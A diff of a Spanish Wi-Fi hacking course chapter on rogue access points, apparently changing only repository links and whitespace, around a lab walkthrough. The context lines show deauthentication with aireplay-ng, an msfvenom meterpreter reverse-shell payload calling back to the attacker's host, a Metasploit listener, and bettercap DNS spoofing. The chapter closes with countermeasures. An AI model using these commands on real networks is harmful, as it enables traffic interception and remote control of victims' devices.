@@ -6,13 +6,13 @@ Antes de finalizar, se debe comentar el funcionamiento y posibles vulnerabilidad
 WPA3 surge en el año 2018 como sucesor de WPA2, debido a las vulnerabilidades comentadas anteriormente sobre los protocolos WPA/WPA2. A fecha de este curso es el protocolo de seguridad en redes inalámbricas más actual y seguro conocido. En mayor detalle, los cambios respecto a WPA2 son: [[42](https://ieeexplore.ieee.org/document/10274082)]
 - **Reemplazo de la PSK por SAE:**
   SAE es un nuevo mecanismo de autenticación que busca sustituir el proporcionado por WPA/WPA2 mediante la clave precompartida, debido a su vulnerabilidad frente ataques de diccionario. Este algoritmo de basa en el estándar de intercambio de clave seguro Dragonfly Key Exchange, dificultando a los atacantes probar masivas cantidades de contraseñas.
-  
+
 - **OWE:**
   Por primera vez en redes abiertas (sin necesidad de introducir claves) se establece un canal privado con cada usuario para cifrar la información que estos trasmiten, impidiendo que usuarios malintencionados puedan ver los datos intercambiados por otros usuarios en la misma red.
-  
+
 - **Forward Secrecy:**
   WPA3 impide que aquellos que han capturado una clave maestra puedan usarla para descifrar la información de una sesión distinta a la que pertenece dicha clave.
-  
+
 - **Enterprise Enhancements:**
   La seguridad en la versión Enterprise, mayormente destinada a entornos que requieren alta seguridad también se ve mejorada con WPA3. Este nuevo cifrado permite un uso consistente de claves de 192 bits en toda la red, así como el uso de algoritmos de cifrado y protección de la integridad robustos, como son AES-GCM-256, SHA-384.
 
@@ -33,12 +33,12 @@ Este tipo de ataques requieren unas condiciones específicas, normalmente difíc
 Este ataque se basa en la configuración de la tarjeta de red del atacante a modo de punto de acceso Wi-Fi que tenga exactamente las mismas características que el punto de acceso que trata de imitar (MAC y SSID principalmente). De esta forma se buscar imitar un punto de acceso concreto al que usualmente se conecta la víctima en cuestión (o al que ya está conectada). Por tanto, al crear este punto de acceso falso que imita al legítimo, el atacante puede aprovechar ciertas configuraciones que le permitan ser indistinguible al original, de tal manera que una señal más fuerte de este haga que el dispositivo víctima se conecte al dispositivo del atacante preferentemente del dispositivo víctima. Otra opción es aprovechar la conexión automática a una red conocida cuando la víctima se encuentra fuera del área del dispositivo legítimo, pero dentro del área de este punto de acceso falso.
 
 
-Además, el punto de acceso falso debe dar servicio a Internet o a la red habitual a la cual se conecta el dispositivo para evitar que el usuario se dé cuenta, lo cual se traduce en la capacidad de robar o cambiar cualquier información que pase a través del dispositivo del atacante (MITM). Por tanto, el atacante tiene la capacidad de realizar entre otros, los ataques relacionados con [`MITM`](https://github.com/Carlosdm06/TFG-Pentesting/tree/Attacks#mitm-con-mensajes-en-claro) vistos en una sección previa. 
+Además, el punto de acceso falso debe dar servicio a Internet o a la red habitual a la cual se conecta el dispositivo para evitar que el usuario se dé cuenta, lo cual se traduce en la capacidad de robar o cambiar cualquier información que pase a través del dispositivo del atacante (MITM). Por tanto, el atacante tiene la capacidad de realizar entre otros, los ataques relacionados con [`MITM`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks#mitm-con-mensajes-en-claro) vistos en una sección previa. 
 
 Por otro lado, resulta necesario conocer la clave del punto de acceso que se desea imitar, ya que para poder hacer un punto de acceso totalmente idéntico y que el usuario no sospeche, es necesario que este tenga la misma contraseña. Además, esto resulta necesario para poder aprovechar las conexiones automáticas que normalmente tenemos activas en nuestros dispositivos.
 
 ### Proceso de Ataque
-Para este ataque se toman como base aquellos ficheros que construyen el laboratorio para [`WPA/WPA2 PSK`](https://github.com/Carlosdm06/TFG-Pentesting/tree/WPA/WPA2-PSK), los cuales se encuentran también en esta rama. Sim embargo, se recomienda encarecidamente elegir la rama que se desee para lanzar el ataque, incluso probar varias de ellas (recalcando que la rama de [`WPA/WPA2 Enterprise`](https://github.com/Carlosdm06/TFG-Pentesting/tree/WPA/WPA2-RADIUS) ya hace un ataque de este estilo con un objetivo diferente). 
+Para este ataque se toman como base aquellos ficheros que construyen el laboratorio para [`WPA/WPA2 PSK`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPA/WPA2-PSK), los cuales se encuentran también en esta rama. Sim embargo, se recomienda encarecidamente elegir la rama que se desee para lanzar el ataque, incluso probar varias de ellas (recalcando que la rama de [`WPA/WPA2 Enterprise`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPA/WPA2-RADIUS) ya hace un ataque de este estilo con un objetivo diferente). 
 
 Como todos los ataques anteriores se debe empezar arrancando el laboratorio y la máquina del atacante con objeto de lanzar las herramientas de `aircrack-ng` que nos permiten analizar la red víctima:
 ```
@@ -170,9 +170,9 @@ aireplay-ng -0 10 -a 02:00:00:00:00:00 wlan4mon
 
 `Nota: ` Al igual que en ataques anteriores, los mensajes EAPOL capturados indican que se ha hecho una autenticación, posiblemente en el punto de acceso creado por el atacante (las `MAC` indican que este proceso es contra el AP atacante).
 
-Tras ver que alguno de los clientes está conectado, nuestro objetivo se habrá cumplido, teniendo así acceso a la información que atraviesa el punto de acceso. De esta forma, se podría lanzar cualquiera de los ataques MITM vistos en el capítulo [`Attacks`](https://github.com/Carlosdm06/TFG-Pentesting/tree/Attacks) (acción que se recomienda probar). Sin embargo, se lanzará un ataque distinto del mismo tipo (MITM) con objeto de comprobar la utilidad de crear un punto de acceso falso que imite al legítimo.
+Tras ver que alguno de los clientes está conectado, nuestro objetivo se habrá cumplido, teniendo así acceso a la información que atraviesa el punto de acceso. De esta forma, se podría lanzar cualquiera de los ataques MITM vistos en el capítulo [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks) (acción que se recomienda probar). Sin embargo, se lanzará un ataque distinto del mismo tipo (MITM) con objeto de comprobar la utilidad de crear un punto de acceso falso que imite al legítimo.
 
-Antes de continuar, sería recomendable dar acceso a Internet o aquella red a la cual el punto de acceso legítimo esté conectado para hacer un ataque más realista. Por este motivo, se realiza una conexión al punto de acceso legítimo (se asume un previo ataque como el mostrado en el capítulo [`WPA/WPA2 PSK Cracking Lab`](https://github.com/Carlosdm06/TFG-Pentesting/tree/WPA/WPA2-PSK) que permita conocer la clave de acceso) desde el punto de acceso falso. Además, se imponen en este último las siguientes reglas `iptables` (reglas de firewall) que permiten que el tráfico viaje del punto de acceso falso al legítimo y al resto de la red:
+Antes de continuar, sería recomendable dar acceso a Internet o aquella red a la cual el punto de acceso legítimo esté conectado para hacer un ataque más realista. Por este motivo, se realiza una conexión al punto de acceso legítimo (se asume un previo ataque como el mostrado en el capítulo [`WPA/WPA2 PSK Cracking Lab`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPA/WPA2-PSK) que permita conocer la clave de acceso) desde el punto de acceso falso. Además, se imponen en este último las siguientes reglas `iptables` (reglas de firewall) que permiten que el tráfico viaje del punto de acceso falso al legítimo y al resto de la red:
 ```
 # Permitir el paso a través de paquetes
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -241,7 +241,7 @@ curl 10.5.1.21
 
 Aquí por ejemplo se ve como intercepta correctamente tráfico HTTP que establece uno de los clientes contra los servidores de la organización.
 
-`Nota: ` Esto es similar a un ataque con `ettercap` para ver el tráfico en plano, tal y como se vio en [`Attacks`](https://github.com/Carlosdm06/TFG-Pentesting/tree/Attacks#mitm-con-mensajes-en-claro).
+`Nota: ` Esto es similar a un ataque con `ettercap` para ver el tráfico en plano, tal y como se vio en [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks#mitm-con-mensajes-en-claro).
 
 De esta forma, se comprueba que el ataque ha sido un éxito, siendo muy difícil de detectar para los usuarios afectados. Por tanto, ha llegado el momento de lanzar un ataque MITM que sea capaz de introducir malware en los dispositivos afectados con objeto de obtener el control sobre estos. En primer lugar, se empezará creando una shell reversa (la víctima se conecta al atacante para que este pueda ejecutar comandos sobre la víctima) a forma de malware con la ayuda de la herramienta `msfpayload` (parte del framework metasploit visto anteriormente):
 ```
@@ -253,7 +253,7 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.5.2.193 LPORT=443 -f elf 
 * `-f elf:` ejecutable de Linux.
 * `-o /attacker/exploit.exe:` fichero donde se creará el malware.
 
-Una vez creado el malware, se debe abrir una consola de `metasploit` (esto ya ha sido usado en [`Attacks`](https://github.com/Carlosdm06/TFG-Pentesting/tree/Attacks#ataque-con-metasploit)) con la intención de preparar la máquina del atacante para que escuche las peticiones de la shell reversa y pueda ejecutar comandos en la víctima una vez esta se conecta:
+Una vez creado el malware, se debe abrir una consola de `metasploit` (esto ya ha sido usado en [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks#ataque-con-metasploit)) con la intención de preparar la máquina del atacante para que escuche las peticiones de la shell reversa y pueda ejecutar comandos en la víctima una vez esta se conecta:
 ```
 msfconsole
 # Una vez dentro de la consola
@@ -278,7 +278,7 @@ python3 -m http.server 80
 ```
 <img width="590" height="267" alt="image" src="https://github.com/user-attachments/assets/0bccc296-95d9-42bf-9bbb-a5ad4356905c" />
 
-Una vez lanzado el servicio solo falta redirigir el tráfico del `carlos.web.com` (también se hizo en el capítulo [`Attacks`](https://github.com/Carlosdm06/TFG-Pentesting/tree/Attacks#dns-spoofing-para-robo-de-credenciales) hacia la web recién creada en `10.5.2.192:80`. Sin embargo, esta vez no usaremos `ettercap`, ya que no funciona muy bien cuando las víctimas se encuentran en 2 interface diferentes (`wlan4` y `wlan5`). En su lugar se usará una herramienta similar conocida como `bettercap` para realizar un `DNS Spoofing` que interfiera el dominio `carlos.web.com` para cambiarlo por la web maliciosa.
+Una vez lanzado el servicio solo falta redirigir el tráfico del `carlos.web.com` (también se hizo en el capítulo [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks#dns-spoofing-para-robo-de-credenciales) hacia la web recién creada en `10.5.2.192:80`. Sin embargo, esta vez no usaremos `ettercap`, ya que no funciona muy bien cuando las víctimas se encuentran en 2 interface diferentes (`wlan4` y `wlan5`). En su lugar se usará una herramienta similar conocida como `bettercap` para realizar un `DNS Spoofing` que interfiera el dominio `carlos.web.com` para cambiarlo por la web maliciosa.
 ```
 # En otra terminal (forzar canal para aireplay)
 docker-compose exec attacker-1 bash
@@ -317,7 +317,7 @@ chmod +x index.html
 
 En este caso se ejecuta de forma manual, ya que se trata de una simulación de un caso real simplificada para observar los peligros que proporcionan los puntos de acceso falsos. Observando cómo conseguimos una consola en la víctima.
 
-Normalmente se usaría la herramienta `Set` vista en el capítulo [`Attacks`](https://github.com/Carlosdm06/TFG-Pentesting/tree/Attacks) para crear un clon de una web visitada habitualmente por las víctimas (se puede observar el tráfico de estos como se vio al probar con `ettercap` y `tcpdump`) que luego se complementa con el malware creado. Este tipo de acciones normalmente te devuelve la página legítima junto a un pop-up que al aceptarlo descarga y ejecuta dicho malware (es necesaria la acción de aceptar, pero suele ser creíble):
+Normalmente se usaría la herramienta `Set` vista en el capítulo [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks) para crear un clon de una web visitada habitualmente por las víctimas (se puede observar el tráfico de estos como se vio al probar con `ettercap` y `tcpdump`) que luego se complementa con el malware creado. Este tipo de acciones normalmente te devuelve la página legítima junto a un pop-up que al aceptarlo descarga y ejecuta dicho malware (es necesaria la acción de aceptar, pero suele ser creíble):
 <img width="670" height="557" alt="image" src="https://github.com/user-attachments/assets/43729f1f-44bb-4180-b35e-4a25462766e3" />
 Sin embargo, en este laboratorio se opta por una adaptación mucho más sencilla debida a las limitaciones del laboratorio.
 
@@ -331,11 +331,11 @@ Con esto se aprecia la importancia de conectarnos al punto de acceso correcto e 
 ### Contramedidas y Recomendaciones
 En cuanto a las protecciones ante este ataque, no basta simplemente con estar atentos a los nombres de las redes a las cuales nos conectamos (a no ser que sean realmente sospechosas de ser falsa), sino que hay que adoptar otras medidas más fuertes. Una buena idea sería evitar la opción de conectarse automáticamente a cualquier red, lo cual no es lo más cómodo en cuanto a usabilidad se refiere, pero podría llegar a ayudar para evitar la imitación de redes típicas (por ejemplo, nombres de puntos de acceso por defecto de las compañías telefónicas). Por otro lado, también se podría intentar limitar el área de alcance del dispositivo que imparte la red al área de la oficina u hogar donde se usa, de forma que solo tengan acceso los que tienen acceso físico a ese lugar. Esto no es nada fácil, pero nuevas tecnologías como WiFi 6 van encaminadas hacia ello.
 
-En cambio, la opción más realista de todas es el uso de una [`VPN`](https://github.com/Carlosdm06/TFG-Pentesting/tree/config#vpn) que cree una red cifrada y segura en una red que no tenga por qué serlo. Esto hace que cualquier información que los usuarios envíen se trasmita por un canal seguro, aunque atraviese una red o dispositivo que no lo sea. Por tanto, su uso sería especialmente aconsejado cuando queramos hacer una comunicación con datos sensibles, no siendo tan necesario en ocasiones en las cuales se visite el periódico local, por ejemplo. También serían interesantes las opciones vistas en el [capítulo anterior](https://github.com/Carlosdm06/TFG-Pentesting/tree/WPA/WPA2-RADIUS#contramedidas-y-recomendaciones) consistentes en el refuerzo de las configuraciones que limitan los puntos de acceso a los que nos conectamos (sobre todo en entornos más grandes administrados por una persona especializada).
+En cambio, la opción más realista de todas es el uso de una [`VPN`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/config#vpn) que cree una red cifrada y segura en una red que no tenga por qué serlo. Esto hace que cualquier información que los usuarios envíen se trasmita por un canal seguro, aunque atraviese una red o dispositivo que no lo sea. Por tanto, su uso sería especialmente aconsejado cuando queramos hacer una comunicación con datos sensibles, no siendo tan necesario en ocasiones en las cuales se visite el periódico local, por ejemplo. También serían interesantes las opciones vistas en el [capítulo anterior](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPA/WPA2-RADIUS#contramedidas-y-recomendaciones) consistentes en el refuerzo de las configuraciones que limitan los puntos de acceso a los que nos conectamos (sobre todo en entornos más grandes administrados por una persona especializada).
 
 Por último, se debe recalcar la importancia de ajustar las medidas y el nivel de seguridad a las necesidades de cada caso, ya que, en ciertas ocasiones, como en entornos del hogar no tendría sentido un excesivo nivel de seguridad con las versiones Enterprise, por ejemplo. Sin embargo, en estos casos no se debe dejar de lado la seguridad por completo, sino que es de vital importancia activar aquellas configuraciones que no comprometan la usabilidad. Sin embargo, en el caso de empresas u organizaciones, si cupiese dedicar más tiempo y recursos a cuidar en mayor profundidad la seguridad de sus redes y dispositivos, haciendo incluso auditorias cada cierto tiempo. Como ya se ha visto, un atacante puede hacer mucho daño a una empresa, a sus trabajadores o a los clientes que le dan la confianza de manejar sus datos. Por tanto, es muy importante que el nivel de seguridad se ajuste a las necesidades, en especial al tratar con datos sensibles de terceros.
 
-`Nota: ` El laboratorio construido tiene mucho más potencial que limitarse a los ataques mostrados, de tal forma que se recomienda encarecidamente su uso para seguir aprendiendo y mejorando las habilidades como auditor. Incluso, sería posible ampliarlo o adaptarlo para la puesta en prueba de algún ataque que necesite de alguna configuración especial o que no se considere. Para ello se recomienda la lectura del capítulo [config](https://github.com/Carlosdm06/TFG-Pentesting/tree/config), donde se pretende dar una visión más detallada de la construcción del laboratorio.
+`Nota: ` El laboratorio construido tiene mucho más potencial que limitarse a los ataques mostrados, de tal forma que se recomienda encarecidamente su uso para seguir aprendiendo y mejorando las habilidades como auditor. Incluso, sería posible ampliarlo o adaptarlo para la puesta en prueba de algún ataque que necesite de alguna configuración especial o que no se considere. Para ello se recomienda la lectura del capítulo [config](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/config), donde se pretende dar una visión más detallada de la construcción del laboratorio.
 
 
-[`Lección anterior, cracking de redes WPA/WPA2 EAP`](https://github.com/Carlosdm06/TFG-Pentesting/tree/WPA/WPA2-RADIUS)
+[`Lección anterior, cracking de redes WPA/WPA2 EAP`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPA/WPA2-RADIUS)
